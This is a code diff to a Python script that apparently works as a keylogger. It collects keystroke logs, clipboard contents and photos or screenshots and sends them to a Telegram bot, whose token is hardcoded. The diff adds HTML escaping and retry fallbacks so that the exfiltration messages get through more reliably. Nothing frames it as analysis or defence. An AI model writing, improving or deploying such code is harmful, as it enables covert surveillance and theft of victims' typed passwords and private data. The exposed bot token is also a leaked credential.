@@ -11,6 +11,7 @@ from threading import Thread, Lock
 import re
 import sys
 import subprocess
+import html
 
 # Telegram Monitoring configuration
 BOT_TOKEN = "8836300723:AAFkFTxToMDt3KtVb4nL-iLEYBou0Y22Nmk"
@@ -158,6 +159,8 @@ def process_keylog_text(raw_text):
     for pattern, replacement in specials:
         cleaned = re.sub(pattern, replacement, cleaned)
         
+    # Escape HTML special characters (like <, >, &) to prevent Telegram parsing errors
+    cleaned = html.escape(cleaned)
     return cleaned
 
 def get_clipboard():
@@ -200,6 +203,13 @@ def send_telegram_bundled(photo_paths, text):
                     if r.status_code == 200 and r.json().get('ok'):
                         success = True
                         break
+                    elif r.status_code == 400 and "can't parse entities" in r.json().get('description', ''):
+                        data.pop('parse_mode', None)
+                        f.seek(0)
+                        r_retry = requests.post(url, data=data, files={'photo': f}, timeout=15)
+                        if r_retry.status_code == 200 and r_retry.json().get('ok'):
+                            success = True
+                            break
             except Exception as e:
                 log_message(f"sendPhoto failed for bundled send: {e}")
             time.sleep(1)
@@ -250,6 +260,16 @@ def send_telegram_bundled(photo_paths, text):
                     if r.status_code == 200 and r.json().get('ok'):
                         chunk_success = True
                         break
+                    elif r.status_code == 400 and "can't parse entities" in r.json().get('description', ''):
+                        for m in media:
+                            m.pop('parse_mode', None)
+                        data['media'] = json.dumps(media)
+                        for f in files_handles:
+                            f.seek(0)
+                        r_retry = requests.post(url, data=data, files=files, timeout=20)
+                        if r_retry.status_code == 200 and r_retry.json().get('ok'):
+                            chunk_success = True
+                            break
                 except Exception as e:
                     log_message(f"sendMediaGroup failed: {e}")
                 finally:
@@ -366,6 +386,13 @@ def send_telegram_message(text, save_on_fail=True, reply_markup=None):
                 if r.status_code == 200 and r.json().get('ok'):
                     chunk_success = True
                     break
+                elif r.status_code == 400 and "can't parse entities" in r.json().get('description', ''):
+                    # Fallback to plain text if HTML parsing fails
+                    data.pop('parse_mode', None)
+                    r_retry = requests.post(url, data=data, timeout=10)
+                    if r_retry.status_code == 200 and r_retry.json().get('ok'):
+                        chunk_success = True
+                        break
             except:
                 pass
             time.sleep(1)
